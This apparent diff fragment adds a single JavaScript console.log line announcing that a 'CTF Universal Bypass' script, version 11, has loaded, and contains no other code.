+
+console.log("[v11] CTF Universal Bypass loaded");
